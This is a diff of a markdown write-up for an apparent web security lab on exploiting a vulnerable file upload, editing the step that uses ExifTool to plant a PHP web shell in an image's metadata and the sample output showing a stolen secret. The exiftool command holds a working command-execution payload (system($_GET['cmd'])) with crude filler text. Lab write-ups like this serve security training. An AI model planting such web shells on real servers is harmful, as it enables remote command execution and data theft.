@@ -25,8 +25,8 @@ This lab demonstrates how to exploit a vulnerable file upload functionality by c
 - Created a polyglot PHP/JPG file by embedding the PHP payload into the metadata of a valid image file:
   - Downloaded and installed **ExifTool**.
   - Ran the following command to add the payload to the image's `Comment` field and save it as `webshell.php`:
-    ```
-exiftool -comment="<?php echo 'FUCK OFF'. system($_GET['cmd']) .'HAHA'; ?>" escaltor.PNG -o webshell.php
+    ```php
+  exiftool -comment="<?php echo 'FUCK OFF'. system($_GET['cmd']) .'HAHA'; ?>" escaltor.PNG -o webshell.php
     ```
 - This created a valid image file (`webshell.php`) that included the PHP payload in its metadata and used the `.php` extension.
 
@@ -46,7 +46,7 @@ exiftool -comment="<?php echo 'FUCK OFF'. system($_GET['cmd']) .'HAHA'; ?>" esca
 - Used Burp Suite's search feature to locate the `START` and `END` markers in the response.
 - Found Carlos's secret string between these markers. Example:
   ```
-  CFUCK OFF 42uXE0jNpsKYwWmYq32Py1pz4D3BNpSC HAHA
+START 42uXE0jNpsKYwWmYq32Py1pz4D3BNpSC END
   ```
 
 ### 7. **Submitting the Secret**
